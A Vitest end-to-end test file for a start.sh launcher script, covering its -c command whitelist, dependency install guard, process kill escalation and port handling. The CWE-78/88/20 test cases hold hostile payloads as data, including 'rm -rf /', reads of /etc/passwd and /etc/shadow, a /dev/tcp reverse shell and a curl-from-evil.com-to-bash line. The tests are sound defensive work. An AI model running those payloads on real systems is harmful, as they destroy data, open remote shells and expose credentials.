// Copyright (c) 2025-2026 Huawei Technologies Co., Ltd.
// This program is free software, you can redistribute it and/or modify it under the terms and conditions of
// CANN Open Software License Agreement Version 2.0 (the "License").
// Please refer to the License for details. You may not use this file except in compliance with the License.
// THIS SOFTWARE IS PROVIDED ON AN "AS IS" BASIS, WITHOUT WARRANTIES OF ANY KIND, EITHER EXPRESS OR IMPLIED,
// INCLUDING BUT NOT LIMITED TO NON-INFRINGEMENT, MERCHANTABILITY, OR FITNESS FOR A PARTICULAR PURPOSE.
// See LICENSE in the root of the software repository for the full text of the License.

import { describe, it, expect } from 'vitest';
import { execSync, spawn } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

// tests/e2e → 包根需退两层（分层重构挪目录时少改了一层，bash 退 127）
const PROJECT_ROOT = path.resolve(__dirname, '..', '..');
const START_SH = path.join(PROJECT_ROOT, 'start.sh');

const ALLOWED_COMMANDS = ['tui', 'sessions', 'session', 'turn', 'search', 'compare', 'stats', 'import', 'delete', 'config'];

function isValidCliCmd(input: string): boolean {
  if (!input) return false;
  return ALLOWED_COMMANDS.includes(input);
}

function runStartSh(cliArg: string): { exitCode: number; stderr: string } {
  try {
    execSync(`bash "${START_SH}" -c '${cliArg.replace(/'/g, "'\\''")}'`, {
      timeout: 5000,
      encoding: 'utf-8',
      stdio: 'pipe',
    });
    return { exitCode: 0, stderr: '' };
  } catch (err: any) {
    return {
      exitCode: err.status ?? 1,
      stderr: err.stderr ?? '',
    };
  }
}

describe('start.sh -c parameter validation', () => {
  describe('whitelist logic: exact string match', () => {
    for (const cmd of ALLOWED_COMMANDS) {
      it(`accepts: ${cmd}`, () => {
        expect(isValidCliCmd(cmd)).toBe(true);
      });
    }

    it('rejects empty string', () => {
      expect(isValidCliCmd('')).toBe(false);
    });

    const invalid = ['foo', 'bash', 'sh', 'exec', 'eval', 'run', 'npm', 'node'];
    for (const cmd of invalid) {
      it(`rejects unknown: ${cmd}`, () => {
        expect(isValidCliCmd(cmd)).toBe(false);
      });
    }
  });

  describe('CWE-78: shell metacharacter injection', () => {
    const payloads = [
      'tui;rm -rf /',
      'tui ; cat /etc/passwd',
      'tui;;echo hacked',
      'tui|cat /etc/passwd',
      'tui||rm -rf /',
      'tui&&whoami',
      'tui`whoami`',
      'tui$(whoami)',
      'tui&sleep 100',
    ];
    for (const payload of payloads) {
      it(`logic rejects: ${payload}`, () => {
        expect(isValidCliCmd(payload)).toBe(false);
      });
    }
  });

  describe('CWE-88: argument delimiter injection', () => {
    const payloads = [
      'tui --server http://evil.com',
      'tui --evil-flag',
      'tui=evil',
    ];
    for (const payload of payloads) {
      it(`logic rejects: ${payload}`, () => {
        expect(isValidCliCmd(payload)).toBe(false);
      });
    }
  });

  describe('CWE-20: input validation edge cases', () => {
    const payloads = [
      '../etc/passwd',
      'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1',
      'curl http://evil.com/shell.sh|bash',
      'echo d2hvYW1p | base64 -d | bash',
      'tui$(cat /etc/shadow)',
    ];
    for (const payload of payloads) {
      it(`logic rejects: ${payload}`, () => {
        expect(isValidCliCmd(payload)).toBe(false);
      });
    }
  });

  describe('integration: start.sh rejects malicious -c and exits 1', () => {
    const rejectPayloads = [
      'tui;rm -rf /',
      'tui|cat /etc/passwd',
      'tui&&whoami',
      'bash -i >&/dev/tcp/10.0.0.1/8080 0>&1',
      'foo',
    ];
    for (const payload of rejectPayloads) {
      it(`start.sh exits 1 for: ${payload}`, () => {
        const result = runStartSh(payload);
        expect(result.exitCode).toBe(1);
        expect(result.stderr).toContain('Invalid CLI command');
      });
    }
  });
});

// 依赖实装守卫（npm ls 校验，cpx install.sh 同款纪律）：git pull 拉到新依赖
// 声明而旧 node_modules 未重装时，start.sh 此前只查目录存在会跳过 npm
// install → next build 期 Module not found（现场：存量部署机 Turbopack
// Can't resolve '7zip-bin'，报错不指向真因）。源码级锁 + 行为级锁
// （kill_all_insight IT 同款单函数提取执行，stub npm 记录调用与退出码）。
describe('start.sh 依赖实装守卫（旧 node_modules × 新依赖声明 → 自动补装）', () => {
  it('源码级：守卫用 npm ls 校验实装状态（回退成目录存在性检查即红）', () => {
    const src = fs.readFileSync(START_SH, 'utf8');
    expect(src).toContain('npm ls --omit=dev --depth=0');
    expect(src).not.toMatch(/\[ ! -d "node_modules" \]/);
  });

  function runGuardCase(opts: {
    nodeModules: boolean; lsExit: number; installExit: number; update: boolean;
  }): { guardExit: number; npmLog: string; stdout: string; errText: string } {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'startsh-deps-it-'));
    try {
      const stubBin = path.join(dir, 'bin');
      fs.mkdirSync(stubBin, { recursive: true });
      if (opts.nodeModules) fs.mkdirSync(path.join(dir, 'node_modules'));
      const npmLog = path.join(dir, 'npm.log');
      fs.writeFileSync(path.join(stubBin, 'npm'), [
        '#!/usr/bin/env bash',
        `printf '%s\\n' "$*" >> ${JSON.stringify(npmLog)}`,
        'case "$1" in',
        `  ls) exit ${opts.lsExit} ;;`,
        `  install) exit ${opts.installExit} ;;`,
        'esac',
        'exit 0',
        '',
      ].join('\n'));
      fs.chmodSync(path.join(stubBin, 'npm'), 0o755);
      // 源码级单函数提取执行（不动 start.sh 其余逻辑）；提取失败即红
      const fn = execSync(
        `sed -n '/^install_deps_if_needed() {/,/^}/p' ${JSON.stringify(START_SH)}`,
        { encoding: 'utf8' },
      );
      expect(fn).toContain('npm ls');
      const runner = path.join(dir, 'runner.sh');
      fs.writeFileSync(runner, [
        `UPDATE=${opts.update}`,
        `source ${JSON.stringify(path.join(dir, 'fn.sh'))}`,
        'install_deps_if_needed 2>guard.err',
        'echo "GUARD_EXIT=$?"',
      ].join('\n'));
      fs.writeFileSync(path.join(dir, 'fn.sh'), fn);
      const stdout = execSync(`bash ${JSON.stringify(runner)}`, {
        encoding: 'utf8',
        cwd: dir,
        env: { ...process.env, PATH: `${stubBin}:${process.env.PATH ?? ''}` },
      });
      const errFile = path.join(dir, 'guard.err');
      return {
        guardExit: parseInt((stdout.match(/GUARD_EXIT=(\d+)/) ?? [])[1] ?? '-1', 10),
        npmLog: fs.existsSync(npmLog) ? fs.readFileSync(npmLog, 'utf8') : '',
        stdout,
        errText: fs.existsSync(errFile) ? fs.readFileSync(errFile, 'utf8') : '',
      };
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  }

  it('健康树：npm ls 通过 → install 不触发，守卫放行', () => {
    const r = runGuardCase({ nodeModules: true, lsExit: 0, installExit: 0, update: false });
    expect(r.guardExit).toBe(0);
    expect(r.npmLog).not.toContain('install');
  });

  it('用户现场形态：node_modules 存在但缺件（npm ls 失败）→ 自动补装', () => {
    const r = runGuardCase({ nodeModules: true, lsExit: 1, installExit: 0, update: false });
    expect(r.guardExit).toBe(0);
    expect(r.npmLog).toContain('install');
  });

  it('无 node_modules：直接安装', () => {
    const r = runGuardCase({ nodeModules: false, lsExit: 1, installExit: 0, update: false });
    expect(r.guardExit).toBe(0);
    expect(r.npmLog).toContain('install');
  });

  it('缺件且安装失败：fail-fast 退出 1（不裸奔进 build 给出误导性 Module not found）', () => {
    const r = runGuardCase({ nodeModules: true, lsExit: 1, installExit: 1, update: false });
    expect(r.guardExit).toBe(1);
    expect(r.errText).toContain('deps incomplete');
  });

  it('-u 更新且安装失败：旧依赖完整可用，不阻断（non-fatal）', () => {
    const r = runGuardCase({ nodeModules: true, lsExit: 0, installExit: 1, update: true });
    expect(r.guardExit).toBe(0);
    expect(r.errText).toContain('non-fatal');
  });
});
// cpx 上传能力整体迁出后，其安装钩子不再做 git-lfs 预取——start.sh 调用行
// 无需任何 env 前缀，启动关键路径天然零网络等待。源码级锁：调用行形如
// `if bash "$PROXY_INSTALL" ...`（重构须同步本测试）。
describe('start.sh cpx 安装步骤（上传链路已迁出，调用行零 env 前缀）', () => {
  it('PROXY_INSTALL 调用行为裸 bash（无 env 前缀）', () => {
    const src = fs.readFileSync(START_SH, 'utf8');
    const m = src.match(/^(\s*)if bash "\$PROXY_INSTALL"/m);
    expect(m, '未找到 PROXY_INSTALL 裸调用行（重构须同步本测试）').toBeTruthy();
    // 任何 env 前缀形态都不得回潮（如 FOO=1 bash "$PROXY_INSTALL"）
    expect(src).not.toMatch(/^\s*if \S+=\S+ bash "\$PROXY_INSTALL"/m);
  });
});

// -k 击杀升级（SIGTERM → 宽限 → SIGKILL）：next-server 对 SIGTERM 走
// graceful close——LISTEN 释放但进程与浏览器 keep-alive 连接双等死锁，
// 浏览器复用旧连接永远转圈（实测 2026-09-20）。行为级 IT：仿真一个忽略
// SIGTERM 的 "next-server"（cmdline 含 next-server + cwd 在假包根，命中
// kill_all_insight 的匹配条件），函数必须在宽限后 SIGKILL 补刀——只有
// SIGTERM 的旧实现杀不掉它，即红。SCRIPT_DIR 指向假包根，真实例零波及。
describe('start.sh -k 击杀升级（SIGTERM 挂死 → SIGKILL 补刀）', () => {
  it('忽略 SIGTERM 的 next-server 残存进程在宽限后被 SIGKILL', async () => {
    const fakeRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'startsh-kill-it-'));
    try {
      fs.writeFileSync(path.join(fakeRoot, 'next-server-fake.js'),
        "process.on('SIGTERM', () => {}); setInterval(() => {}, 1000);\n");
      const fake = spawn(process.execPath, [path.join(fakeRoot, 'next-server-fake.js')], {
        cwd: fakeRoot,
        stdio: 'ignore',
      });
      const exited = new Promise<number>((resolve) => fake.on('exit', (c) => resolve(c ?? -1)));

      // 源码级单函数提取执行（不动 start.sh 其余逻辑）；先锁升级语义存在。
      // kill_all_insight 依赖 proc_cwd（cwd 锚定跨平台解析），须连带提取。
      const fn = [
        execSync(`sed -n '/^proc_cwd() {/,/^}/p' ${JSON.stringify(START_SH)}`, { encoding: 'utf8' }),
        execSync(`sed -n '/^kill_all_insight() {/,/^}/p' ${JSON.stringify(START_SH)}`, { encoding: 'utf8' }),
      ].join('\n');
      expect(fn).toContain('kill -9');
      const runner = path.join(fakeRoot, 'runner.sh');
      fs.writeFileSync(runner, [
        `SCRIPT_DIR=${JSON.stringify(fakeRoot)}`,
        `source ${JSON.stringify(path.join(fakeRoot, 'fn.sh'))}`,
        'kill_all_insight',
      ].join('\n'));
      fs.writeFileSync(path.join(fakeRoot, 'fn.sh'), fn);
      execSync(`bash ${JSON.stringify(runner)}`, { encoding: 'utf8', timeout: 20_000 });

      // 仿真件忽略 SIGTERM：只有 SIGKILL 能终结它——宽限后不死即升级失效
      const code = await Promise.race([
        exited,
        new Promise<number>((_, rej) => setTimeout(() => rej(new Error('仿真件未被 SIGKILL：击杀升级失效')), 8_000)),
      ]);
      expect(code).toBeLessThan(0);
    } finally {
      fs.rmSync(fakeRoot, { recursive: true, force: true });
    }
  }, 30_000);
});

// ─────────────────────────────────────────────────────────────────────
describe('start.sh 单实例收口（默认=杀已有自家实例后固定 BASE_PORT，不端口漂移）', () => {
  it('源级：kill_all_insight + ensure_base_port_free 无条件调用（无 KILL_EXISTING 门槛）', () => {
    const src = fs.readFileSync(START_SH, 'utf8');
    // KILL_EXISTING 变量整体退役（-k 仅历史别名）——门槛复活即红
    expect(src).not.toContain('KILL_EXISTING');
    // 收口调用对存在（无条件、紧跟）
    expect(src).toMatch(/^kill_all_insight$/m);
    expect(src).toMatch(/^ensure_base_port_free$/m);
  });

  it('源级：端口漂移顺延扫描整体退役（MAX_ATTEMPTS/trying next 消失）', () => {
    const src = fs.readFileSync(START_SH, 'utf8');
    expect(src).not.toContain('MAX_ATTEMPTS');
    expect(src).not.toContain('trying next');
  });

  it('源级：smart-agent 恒 clean 模式（默认路径残留泄漏修复）', () => {
    const src = fs.readFileSync(START_SH, 'utf8');
    expect(src).toMatch(/pick-smart-agent-port\.sh.*"?\$SCRIPT_DIR"? clean/);
    expect(src).not.toMatch(/pick-smart-agent-port\.sh.*echo clean \|\| echo keep/);
  });

  it('源级：无关占用 fail-fast 诊断（占用者 PID/命令行 + 不漂移指引）', () => {
    const src = fs.readFileSync(START_SH, 'utf8');
    expect(src).toContain('ensure_base_port_free() {');
    expect(src).toContain('held by PID');
    expect(src).toContain('Single-instance mode does not port-drift');
  });

  it('行为级：无关进程占住端口 → 等待超时 fail-fast（exit 1 + 诊断含占用者 PID）', async () => {
    const fakeRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'startsh-port-it-'));
    try {
      // 仿真无关 LISTEN 进程占住一个高位端口
      const port = 21000 + Math.floor(Math.random() * 2000);
      fs.writeFileSync(path.join(fakeRoot, 'holder.js'),
        `require('net').createServer().listen(${port}, '127.0.0.1', () => setInterval(() => {}, 1000));\n`);
      const holder = spawn(process.execPath, [path.join(fakeRoot, 'holder.js')], { stdio: 'ignore' });
      await new Promise<void>((resolve) => {
        const t = setInterval(() => {
          try { (require('net') as typeof import('net')).connect(port, '127.0.0.1').on('error', () => {}).on('close', () => { clearInterval(t); resolve(); }).end(); } catch { /* */ }
        }, 50);
      });
      expect(holder.pid).toBeGreaterThan(0);

      // 单函数提取执行（与 -k 击杀升级测试同款纪律）：port_pid/port_busy/
      // ensure_base_port_free + BASE_PIN 高位端口
      const fns = [
        execSync(`sed -n '/^port_pid() {/,/^}/p' ${JSON.stringify(START_SH)}`, { encoding: 'utf8' }),
        execSync(`sed -n '/^port_busy() {/,/^}/p' ${JSON.stringify(START_SH)}`, { encoding: 'utf8' }),
        execSync(`sed -n '/^ensure_base_port_free() {/,/^}/p' ${JSON.stringify(START_SH)}`, { encoding: 'utf8' }),
      ].join('\n');
      const runner = path.join(fakeRoot, 'runner.sh');
      fs.writeFileSync(runner, [
        `BASE_PORT=${port}`,
        fns,
        'ensure_base_port_free',
        'echo "SHOULD_NOT_REACH"',
      ].join('\n'));
      const r = execSync(`bash ${JSON.stringify(runner)} 2>&1; echo "EXIT=$?"`, { encoding: 'utf8', timeout: 60_000 });
      expect(r).toContain('EXIT=1');
      expect(r).toContain('still occupied');
      expect(r).toContain(`PID ${holder.pid}`);
      expect(r).not.toContain('SHOULD_NOT_REACH');
      holder.kill('SIGKILL');
    } finally {
      fs.rmSync(fakeRoot, { recursive: true, force: true });
    }
  }, 90_000);

  it('行为级：端口空闲 → ensure_base_port_free 零等待通过（exit 0）', () => {
    const fakeRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'startsh-port-free-'));
    try {
      const port = 23000 + Math.floor(Math.random() * 2000);
      const fns = [
        execSync(`sed -n '/^port_pid() {/,/^}/p' ${JSON.stringify(START_SH)}`, { encoding: 'utf8' }),
        execSync(`sed -n '/^port_busy() {/,/^}/p' ${JSON.stringify(START_SH)}`, { encoding: 'utf8' }),
        execSync(`sed -n '/^ensure_base_port_free() {/,/^}/p' ${JSON.stringify(START_SH)}`, { encoding: 'utf8' }),
      ].join('\n');
      const runner = path.join(fakeRoot, 'runner.sh');
      fs.writeFileSync(runner, [`BASE_PORT=${port}`, fns, 'ensure_base_port_free', 'echo OK'].join('\n'));
      const r = execSync(`bash ${JSON.stringify(runner)} 2>&1; echo "EXIT=$?"`, { encoding: 'utf8', timeout: 30_000 });
      expect(r).toContain('EXIT=0');
      expect(r).toContain('OK');
    } finally {
      fs.rmSync(fakeRoot, { recursive: true, force: true });
    }
  }, 60_000);
});

// ─────────────────────────────────────────────────────────────────────
// macOS（无 /proc）单实例收口兜底（PR #38 审查意见）：kill_all_insight 原先
// 只靠 readlink /proc/$pid/cwd 锚定——mac 上恒为空 → 自家实例永不命中 →
// 旧生产实例占着 BASE_PORT 时 ensure_base_port_free 10s 超时硬失败，
// 「杀旧重启」在主要开发环境（darwin）上不成立。proc_cwd 跨平台解析：
// /proc readlink → lsof -a -p <pid> -d cwd -Fn（macOS 路径）。
describe('start.sh 单实例收口 macOS 兜底（proc_cwd：/proc → lsof -d cwd）', () => {
  it('源级：proc_cwd 定义存在；kill_all_insight 走 proc_cwd 锚定（不再裸 readlink /proc）；过期注释已清理', () => {
    const src = fs.readFileSync(START_SH, 'utf8');
    expect(src).toContain('proc_cwd() {');
    const fn = execSync(`sed -n '/^kill_all_insight() {/,/^}/p' ${JSON.stringify(START_SH)}`, { encoding: 'utf8' });
    expect(fn).toContain('proc_cwd "$pid"');
    expect(fn).not.toContain('readlink "/proc');
    // 「-k 的忙端口回退」语义已不存在（单实例不漂移）——注释复活即红
    expect(src).not.toContain('忙端口回退');
  });

  it('行为级（Linux）：proc_cwd 经 /proc 解析活进程真实 cwd', () => {
    const fakeRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'startsh-cwd-it-'));
    try {
      const proc = spawn(process.execPath, ['-e', 'setInterval(() => {}, 1000)'], { cwd: fakeRoot, stdio: 'ignore' });
      try {
        const fn = execSync(`sed -n '/^proc_cwd() {/,/^}/p' ${JSON.stringify(START_SH)}`, { encoding: 'utf8' });
        expect(fn).not.toBe('');
        const runner = path.join(fakeRoot, 'runner.sh');
        fs.writeFileSync(runner, [fn, `echo "CWD=$(proc_cwd ${proc.pid})"`].join('\n'));
        const r = execSync(`bash ${JSON.stringify(runner)}`, { encoding: 'utf8' });
        expect(r.trim()).toBe(`CWD=${fakeRoot}`);
      } finally {
        proc.kill('SIGKILL');
      }
    } finally {
      fs.rmSync(fakeRoot, { recursive: true, force: true });
    }
  });

  it('行为级（macOS 形态，stub lsof）：/proc 缺失时走 lsof -a -p <pid> -d cwd -Fn 并解析 n 行', () => {
    const fakeRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'startsh-lsof-it-'));
    try {
      const stubBin = path.join(fakeRoot, 'bin');
      fs.mkdirSync(stubBin, { recursive: true });
      const lsofLog = path.join(fakeRoot, 'lsof.log');
      fs.writeFileSync(path.join(stubBin, 'lsof'), [
        '#!/usr/bin/env bash',
        `printf '%s\\n' "$*" >> ${JSON.stringify(lsofLog)}`,
        'echo "p999999999"',
        'echo "fcwd"',
        'echo "n/recorded/cwd/path"',
        '',
      ].join('\n'));
      fs.chmodSync(path.join(stubBin, 'lsof'), 0o755);
      const fn = execSync(`sed -n '/^proc_cwd() {/,/^}/p' ${JSON.stringify(START_SH)}`, { encoding: 'utf8' });
      expect(fn).toContain('lsof -a -p "$pid" -d cwd -Fn');
      const runner = path.join(fakeRoot, 'runner.sh');
      // pid 999999999 不存在 → /proc 分支不命中 → lsof 分支（macOS 同形路径）
      fs.writeFileSync(runner, [fn, 'echo "CWD=$(proc_cwd 999999999)"'].join('\n'));
      const r = execSync(`bash ${JSON.stringify(runner)}`, {
        encoding: 'utf8',
        env: { ...process.env, PATH: `${stubBin}:${process.env.PATH ?? ''}` },
      });
      expect(r.trim()).toBe('CWD=/recorded/cwd/path');
      expect(fs.readFileSync(lsofLog, 'utf8')).toContain('-a -p 999999999 -d cwd -Fn');
    } finally {
      fs.rmSync(fakeRoot, { recursive: true, force: true });
    }
  });
});
